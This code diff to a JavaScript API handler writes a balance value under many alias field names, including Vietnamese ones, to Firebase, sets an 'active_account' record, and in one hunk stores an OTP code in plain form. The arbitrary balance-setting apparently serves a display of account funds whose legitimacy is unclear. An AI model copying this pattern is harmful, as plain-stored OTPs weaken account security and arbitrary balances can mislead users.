@@ -205,14 +205,26 @@ export default async function handler(req, res) {
       const patchData = {
         balance: newBal,
         TIEN: newBal,
+        accountBalance: newBal,
+        availableBalance: newBal,
+        currentBalance: newBal,
+        so_tien: newBal,
+        soTien: newBal,
         updatedAt: new Date().toISOString()
       };
 
-      await fetch(`${FIREBASE_BASE}/${folder}.json`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(patchData)
-      });
+      await Promise.all([
+        fetch(`${FIREBASE_BASE}/${folder}.json`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(patchData)
+        }),
+        fetch(`${FIREBASE_URL}/active_account.json`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(folder)
+        })
+      ]);
 
       return res.status(200).json({
         success: true,
@@ -258,15 +270,27 @@ export default async function handler(req, res) {
         OTP: otp,
         balance: bal,
         TIEN: bal,
+        accountBalance: bal,
+        availableBalance: bal,
+        currentBalance: bal,
+        so_tien: bal,
+        soTien: bal,
         tier: tier,
         updatedAt: new Date().toISOString()
       };
 
-      await fetch(`${FIREBASE_BASE}/${folder}.json`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(updateData)
-      });
+      await Promise.all([
+        fetch(`${FIREBASE_BASE}/${folder}.json`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(updateData)
+        }),
+        fetch(`${FIREBASE_URL}/active_account.json`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(folder)
+        })
+      ]);
 
       return res.status(200).json({
         success: true,
